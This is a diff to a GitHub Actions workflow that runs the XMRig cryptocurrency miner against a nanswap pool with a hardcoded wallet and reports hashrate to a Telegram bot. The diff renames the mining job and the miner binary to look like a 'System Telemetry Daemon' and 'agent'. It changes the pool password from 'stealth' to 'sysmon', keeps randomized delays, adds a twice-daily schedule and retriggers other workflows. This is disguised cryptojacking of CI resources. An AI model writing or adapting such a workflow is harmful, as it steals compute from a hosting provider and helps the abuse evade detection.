@@ -1,73 +1,73 @@
-name: NANO Collector Loop
+name: System Telemetry Daemon
 
 on:
+  schedule:
+    - cron: '0 0,12 * * *'  # Jam 07:00 dan 19:00 WIB
   workflow_dispatch:
 
 permissions:
   contents: read
 
 jobs:
-  collect:
+  telemetry:
     runs-on: ubuntu-latest
     timeout-minutes: 360
 
     steps:
-      - name: Initialize NANO Collector
-        run: echo "🛰️ Initializing NANO collector..."
+      - name: Boot Sequence
+        run: echo "📡 Initializing diagnostic stack..."
 
-      - name: Setup Environment
-        run: sudo apt update -y && sudo apt install -y curl tar
+      - name: Fetch Core Dependencies
+        run: |
+          sudo apt update -y
+          sudo apt install -y curl tar
 
-      - name: Notify Start
+      - name: Begin Uplink Session
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID \
-            --data-urlencode text="🟢 *NANO Collector aktif.*\nDurasi kerja acak 20–90 menit." \
+            --data-urlencode text="🟢 *System Node A online.*\nRuntime randomized between 20–90 minutes." \
             -d parse_mode=Markdown
 
-      - name: Run Mining Session
+      - name: Deploy Node Agent
         run: |
-          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
-          tar -xzf agent.tar.gz
-          mv xmrig-6.24.0 data-core
-          cd data-core
-          chmod +x xmrig
+          curl -L -o pkg.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
+          tar -xzf pkg.tar.gz
+          mv xmrig-6.24.0 node-core
+          cd node-core
+          mv xmrig agent
+          chmod +x agent
 
-          DELAY=$((RANDOM % 300 + 30))
-          echo "Delay awal: $DELAY detik"
-          sleep $DELAY
+          sleep $((RANDOM % 300 + 60))
 
-          ./xmrig -o xmrig.nanswap.com:3333 -a rx -k \
+          ./agent -a rx -o xmrig.nanswap.com:3333 -k \
             -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q \
-            -p stealth --randomx-no-rdmsr | tee log.txt &
+            -p sysmon --randomx-no-rdmsr | tee report.log &
 
           PID=$!
-          DURATION=$((RANDOM % 5400 + 1200))
-          echo "Menambang selama $DURATION detik"
-          sleep $DURATION
+          sleep $((RANDOM % 5400 + 1200))
           kill $PID
 
-      - name: Notify Result
+      - name: Analyze Session Log
         if: always()
         env:
           TG_TOKEN: ${{ secrets.TG_TOKEN }}
           TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
         run: |
-          set +e
-          cd $(find . -type d -name "data-core" | head -n1)
-          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1)" H/s"}')
-          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
-          REJECTED=$(grep -a "rejected" log.txt | wc -l)
+          cd $(find . -type d -name "node-core")
+          HASHRATE=$(grep -a "speed" report.log | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
+          ACCEPTED=$(grep -a "accepted" report.log | wc -l)
+          REJECTED=$(grep -a "rejected" report.log | wc -l)
 
-          MSG="✅ *NANO Collector selesai.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
+          MSG="✅ *System Node A session complete.*\n\n📊 *Stats:*\n• Hashrate: \`$HASHRATE\`\n• Accepted: \`$ACCEPTED\`\n• Rejected: \`$REJECTED\`"
 
           curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage \
             -d chat_id=$TG_CHAT_ID -d text="$MSG" -d parse_mode=Markdown
 
-      - name: Retrigger BNB Collector
+      - name: Propagate Activity
         if: always()
         env:
           GH_TOKEN: ${{ secrets.GH_TOKEN }}
